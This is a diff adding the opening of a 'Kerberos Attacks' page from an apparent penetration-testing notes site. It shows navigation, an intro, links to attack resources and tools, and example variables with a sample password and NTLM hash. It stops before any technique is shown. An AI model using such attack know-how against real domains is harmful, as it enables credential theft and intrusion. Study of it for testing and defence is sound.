@@ -1,0 +1,3069 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/Kerberos_Attacks/">
+      
+      
+        <link rel="prev" href="../Credential_Access/">
+      
+      
+        <link rel="next" href="../NTLM_Relay_and_Coercion/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Kerberos Attacks - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#kerberos-attacks" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Kerberos Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Auth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Credential_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asrep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ASREP Roasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overpass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overpass the Hash
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Silver Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Golden Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#diamond-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Diamond Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#s4u2self-s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Self S4U2Proxy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberos-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Delegation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#unconstrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unconstrained Delegation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Constrained Delegation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resource-based-constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resource Based Constrained Delegation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberos-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM_Relay_and_Coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lateral_Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Domain_Compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="kerberos-attacks">Kerberos Attacks</h1>
+<p>Kerberos attacks focus on abusing tickets, service principals, delegation, encryption keys, and trust relationships inside Active Directory.</p>
+<p>This section assumes basic AD and Kerberos concepts are already known: users, computers, SPNs, KDC, TGT, TGS, PAC, realms, service tickets, and authentication flows.</p>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/">The Hacker Recipes - Kerberos</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast">The Hacker Recipes - Kerberoast</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/asreproast">The Hacker Recipes - ASREProast</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/">The Hacker Recipes - Delegations</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+<li><a href="https://wadcoms.github.io/">WADComs</a></li>
+</ul>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">REALM</span><span class="o">=</span>CORP.LOCAL
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>filesrv01.corp.local
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET_IP</span><span class="o">=</span><span class="m">10</span>.10.10.20
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NTLM</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AES256</span><span class="o">=</span><span class="s1">&#39;0000000000000000000000000000000000000000000000000000000000000000&#39;</span>
